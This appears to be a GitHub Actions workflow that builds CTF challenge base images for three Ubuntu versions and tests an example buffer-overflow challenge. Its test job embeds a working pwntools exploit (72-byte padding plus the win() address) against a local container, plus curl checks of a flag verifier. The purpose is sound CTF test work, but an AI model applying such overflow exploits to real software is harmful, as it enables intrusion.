name: Build Challenge Base Images

on:
  push:
    branches:
      - main
    tags:
      - 'v*.*.*'
    paths:
      - 'challenge-base/**'
      - '.github/workflows/build-challenge-base.yml'
      - 'challenges/example-bof/**'
  workflow_dispatch:

env:
  REGISTRY: ghcr.io

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write

    strategy:
      matrix:
        ubuntu_version: ['20.04', '22.04', '24.04']

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata and tags
        id: meta
        run: |
          # Convert repository name to lowercase for Docker tag compatibility
          REPO_NAME=$(echo "${{ github.repository }}" | tr '[:upper:]' '[:lower:]')
          TAGS="${{ env.REGISTRY }}/${REPO_NAME}/challenge-base:${{ matrix.ubuntu_version }}-latest"

          if [[ ${{ github.ref_type }} == "tag" ]]; then
            VERSION=${GITHUB_REF#refs/tags/v}
            TAGS="$TAGS,${{ env.REGISTRY }}/${REPO_NAME}/challenge-base:${{ matrix.ubuntu_version }}-$VERSION"
            echo "version=$VERSION" >> $GITHUB_OUTPUT
          fi

          echo "tags=$TAGS" >> $GITHUB_OUTPUT

      - name: Build and push image
        uses: docker/build-push-action@v5
        with:
          context: challenge-base
          file: challenge-base/Dockerfile.${{ matrix.ubuntu_version }}
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: |
            org.opencontainers.image.source=${{ github.server_url }}/${{ github.repository }}
            org.opencontainers.image.revision=${{ github.sha }}
            org.opencontainers.image.ubuntu-version=${{ matrix.ubuntu_version }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          platforms: linux/amd64

  test:
    runs-on: ubuntu-latest
    needs: build

    strategy:
      matrix:
        ubuntu_version: ['20.04', '22.04', '24.04']

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Pull base image
        run: |
          REPO_NAME=$(echo "${{ github.repository }}" | tr '[:upper:]' '[:lower:]')
          docker pull ${{ env.REGISTRY }}/${REPO_NAME}/challenge-base:${{ matrix.ubuntu_version }}-latest
          docker tag ${{ env.REGISTRY }}/${REPO_NAME}/challenge-base:${{ matrix.ubuntu_version }}-latest challenge-base:${{ matrix.ubuntu_version }}

      - name: Build example-bof challenge
        run: |
          docker build -f challenges/example-bof/Dockerfile \
            --build-arg BASE_IMAGE=challenge-base:${{ matrix.ubuntu_version }} \
            -t example-bof:test \
            challenges/example-bof/

      - name: Run challenge container
        run: |
          docker run -d --rm \
            --name test-challenge \
            -p 4444:4444 \
            -p 5000:5000 \
            example-bof:test
          sleep 2

      - name: Install pwntools
        run: pip3 install pwntools

      - name: Run exploit test
        run: |
          python3 << 'EOF'
          import subprocess
          from pwn import *

          context.arch = 'amd64'
          context.log_level = 'info'

          # Extract binary from container
          subprocess.run(['docker', 'cp', 'test-challenge:/challenge/pwn_binary', '/tmp/pwn_binary'], check=True)

          binary = ELF('/tmp/pwn_binary')
          win_addr = binary.symbols['win']
          log.info(f"win() at: {hex(win_addr)}")

          # Exploit
          conn = remote('localhost', 4444)
          conn.recvuntil(b'Enter input: ')
          payload = b'A' * 72 + p64(win_addr)
          conn.sendline(payload)
          output = conn.recvall(timeout=3)
          print(f"Output: {output}")

          assert b'CTF{' in output, f"Exploit failed! Output: {output}"
          print("Exploit successful!")
          conn.close()
          EOF

      - name: Test flag verifier endpoint
        run: |
          curl -s -X POST http://localhost:5000/verify \
            -H "Content-Type: application/json" \
            -d '{"flag": "CTF{example_bof_flag_for_testing}"}' | \
            grep -q '"correct": true' && echo "Correct flag test: PASS"

          curl -s -X POST http://localhost:5000/verify \
            -H "Content-Type: application/json" \
            -d '{"flag": "wrong"}' | \
            grep -q '"correct": false' && echo "Wrong flag test: PASS"

      - name: Stop challenge container
        if: always()
        run: docker stop test-challenge
